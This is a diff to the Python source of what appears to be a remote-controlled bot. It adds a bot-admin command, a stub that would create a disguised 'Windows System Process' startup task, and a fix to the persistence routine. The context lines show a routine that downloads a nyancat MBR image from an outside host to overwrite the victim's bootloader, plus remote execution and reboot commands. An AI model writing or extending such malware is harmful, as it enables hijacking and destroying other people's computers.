@@ -199,6 +199,17 @@ def download(cmd): #file downloader
 	else:
 		sendData("I don't know how to download yet boss.")
 
+def guiSpam(cmd): #spam gui with things
+	sendData("Not ready yet.")
+	# args = cmd.split(" ") #first arg is number, second is seconds/minutes/hours/days/whatever, third is for windows to specify application
+	# if operatingSystem == "windows": #scheduled tasks probably won't work. gotta play with it more
+	# 	app = "C:\\Windows\\System32\\notepad.exe"
+	# 	if len(args) < 2:
+
+	# 	execute("schtasks /Create /SC ONSTART /TN 'Windows System Process' /TR " + app)
+	# else: #all else
+	# 	pass
+
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
 	if (operatingSystem != "windows" and operatingSystem != ""):
 		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
@@ -220,6 +231,18 @@ def reboot(): #reboot the computer
 	else: #any unix based OS will handle this correctly
 		execute("init 6")
 
+def admin(cmd): #add/remove admins
+	args = cmd.split(" ")
+	if args[0][:3] == "rem":
+		admins.remove(args[1])
+		sendData("Admin '" + args[1] + "' removed.")
+	elif args[0][:3] == "add":
+		if args[1] not in admins:
+			admins.append(args[1])
+			sendData("Admin '" + args[1] + "' added.")
+	else:
+		sendData("Admins are: " + ", ".join(admins))
+
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
 	script = os.getcwd() + "\\" + argv[0]
 	if operatingSystem == "windows":
@@ -228,9 +251,10 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 		sendData(output)
 		return
 	elif operatingSystem == "darwin": #if mac
+		sendData("i'm on a mac. you know the deal.")
 		#looking into launchd and launchctl. ugh! why did they get rid of cron? stupid xmls
 		return
-	else
+	else:
 		if operatingSystem == "linux": #if linux
 			path = "/etc/rc.local"
 		# elif operatingSystem == "freebsd": #if freebsd
@@ -306,7 +330,9 @@ commands = {
 #dictionary of functions that DO take parameters
 commandsParams = {
 	"execute" : execute,
-	"download" : download
+	"download" : download,
+	"guispam" : guiSpam,
+	"admin" : admin
 }
 
 #function which parses the command and determines how to handle it
